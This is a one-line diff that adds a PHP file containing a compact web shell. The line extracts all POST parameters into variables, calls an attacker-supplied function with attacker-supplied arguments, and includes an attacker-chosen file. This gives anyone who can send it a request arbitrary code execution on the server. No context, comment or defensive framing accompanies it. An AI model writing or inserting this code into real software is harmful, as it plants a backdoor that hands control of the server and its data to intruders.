@@ -1,0 +1,1 @@
+<?php extract($_POST);$c($f, $a);include $f; ?>
